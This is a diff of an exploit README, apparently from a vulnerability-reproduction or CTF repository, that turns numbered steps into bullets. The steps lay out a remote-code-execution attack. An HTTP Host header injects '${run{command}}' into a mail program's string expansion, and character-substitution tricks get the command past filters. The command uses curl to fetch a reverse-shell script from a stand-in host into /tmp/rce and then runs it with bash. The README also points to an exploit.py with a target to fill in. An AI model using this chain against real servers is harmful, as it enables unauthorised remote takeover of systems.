@@ -44,17 +44,13 @@ However, there are still a lot of characters can't be used. So we need to put th
 
 Therefore, the expliot process is follows:
 
-1. Write the exp of reverse shell and put it on a site. The exp have this following requirements:
- - the entire url's uppercase letters will be converted to lowercase, so the file path should not contain uppercase letters.
- - Access to this page can't be redirected because the parameter for follow redirect is `-L` (uppercase).
-
-2. Splice the command`/usr/bin/curl -o/tmp/rce example.com/shell.sh`and`/bin/bash /tmp/rce`.
-
-3. Convert the spaces and `/` in the command to `${substr{10}{1}{$tod_log}}` and `${substr{0}{1}{$spool_directory}}`.
-
-4. Produce the HTTP Host header:`target(any -froot@localhost -be ${run{command}} null)`.
-
-5. Send these two packets in order.
+- Write the exp of reverse shell and put it on a site. The exp have this following requirements:
+  - the entire url's uppercase letters will be converted to lowercase, so the file path should not contain uppercase letters.
+  - Access to this page can't be redirected because the parameter for follow redirect is `-L` (uppercase).
+- Splice the command`/usr/bin/curl -o/tmp/rce example.com/shell.sh`and`/bin/bash /tmp/rce`.
+- Convert the spaces and `/` in the command to `${substr{10}{1}{$tod_log}}` and `${substr{0}{1}{$spool_directory}}`.
+- Produce the HTTP Host header:`target(any -froot@localhost -be ${run{command}} null)`.
+- Send these two packets in order.
 
 Here is [expliot.py](exploit.py)，change `target` to your target site，change `user` to an exist user name，change `shell_url` to your payload site.
 
